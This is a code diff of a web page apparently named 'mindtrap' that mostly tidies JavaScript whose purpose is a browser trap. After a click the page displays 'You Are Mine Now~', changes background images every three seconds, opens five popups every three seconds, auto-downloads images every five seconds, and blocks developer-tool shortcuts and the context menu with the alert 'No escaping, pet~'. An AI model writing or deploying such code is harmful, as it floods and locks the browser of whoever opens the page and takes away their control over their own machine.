@@ -65,7 +65,6 @@
       "https://github.com/velvettemptress/mindtrap/blob/main/20250516_1235_image.png?raw=true",
       "https://raw.githubusercontent.com/velvettemptress/mindtrap/84827059fcec2bf91379c11258d9c63788d73f62/20250516_1235_image(1).png",
       "https://raw.githubusercontent.com/velvettemptress/mindtrap/84827059fcec2bf91379c11258d9c63788d73f62/20250516_1235_image(2).png"
-      // ... you can add more as needed
     ];
 
     let usedIndexes = [];
@@ -83,8 +82,8 @@
     function openPopup(url) {
       const width = 400;
       const height = 400;
-      const left = Math.floor(Math.random() * (window.screen.width - width));
-      const top = Math.floor(Math.random() * (window.screen.height - height));
+      const left = Math.floor(Math.random() * (screen.width - width));
+      const top = Math.floor(Math.random() * (screen.height - height));
       const features = `width=${width},height=${height},left=${left},top=${top}`;
       const popup = window.open("", "_blank", features);
 
@@ -98,22 +97,23 @@
 
     function startTrap() {
       document.body.innerHTML = "<h1>You Are Mine Now~ 💕</h1>";
+      document.body.style.backgroundColor = "black";
+      document.body.style.color = "hotpink";
+      document.body.style.fontFamily = "Arial, sans-serif";
+      document.body.style.textAlign = "center";
+      document.body.style.height = "100vh";
+      document.body.style.margin = "0";
 
-      // Change background every 3s
       setInterval(() => {
-        const url = getRandomImage();
-        document.body.style.backgroundImage = `url(${url})`;
+        document.body.style.backgroundImage = `url(${getRandomImage()})`;
       }, 3000);
 
-      // Open up to 5 popups at once every 3s (if allowed)
       setInterval(() => {
         for (let i = 0; i < 5; i++) {
-          const url = getRandomImage();
-          openPopup(url);
+          openPopup(getRandomImage());
         }
       }, 3000);
 
-      // Auto-download every 5s
       setInterval(() => {
         const url = getRandomImage();
         const link = document.createElement("a");
@@ -127,19 +127,18 @@
 
     document.getElementById("startBtn").addEventListener("click", startTrap);
 
-    // Disable escape keys
-    document.addEventListener('keydown', function(event) {
+    document.addEventListener('keydown', function(e) {
       if (
-        event.key === "F12" ||
-        (event.ctrlKey && event.shiftKey && ["I", "J"].includes(event.key)) ||
-        (event.ctrlKey && event.key === "U")
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && ["I", "J"].includes(e.key)) ||
+        (e.ctrlKey && e.key === "U")
       ) {
-        event.preventDefault();
+        e.preventDefault();
         alert("No escaping, pet~ 💕");
       }
     });
 
-    document.addEventListener('contextmenu', event => event.preventDefault());
+    document.addEventListener('contextmenu', e => e.preventDefault());
   </script>
 </body>
 </html>
